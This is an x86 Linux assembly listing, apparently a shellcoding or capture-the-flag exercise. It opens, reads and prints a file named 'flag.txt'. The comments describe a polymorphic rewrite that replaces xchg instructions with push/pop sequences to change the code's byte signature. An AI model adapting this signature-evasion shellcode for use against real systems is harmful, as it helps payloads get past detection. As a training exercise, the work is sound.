global _start


section .text

_start:
	xor ecx,ecx
	xor eax,eax
	xor edx,edx			; longer way to clear these 3 registers 
	mov al,0x5 
	push edx			; can switch this to any of the cleared registers as we're just pushing a null, changed to edx 
	push dword 0x7478742e
	push dword 0x67616c66
	mov ebx,esp 
	int 0x80
	push eax			; Step 1
	push ebx			; Step 2
	push ecx			; Step 3
	pop eax				; Step 4
	pop ecx				; Step 5
	pop ebx 			; Step 6, we just replaced two simple xchg opcodes with 6 lines of push/pops
	mov al,0x3  
	mov dx,0xfff			; deleted previous line which was xor edx,edx since edx is still zeroed 
	inc edx 
	int 0x80
	push eax			; Step 1
	push edx			; Step 2
	pop eax				; Step 3
	pop edx	 			; Step 4, we just replaced a simple xchg opcde with 4 lines of push/pops 
	xor eax,eax 
	mov al,0x4 
	mov bl,0x1 
	int 0x80
	push eax			; Step 1
	push ebx			; Step 2
	pop eax				; Step 3
	pop ebx				; Step 4, we just replaced a simple xchg opcode with 4 lines of push/pops 

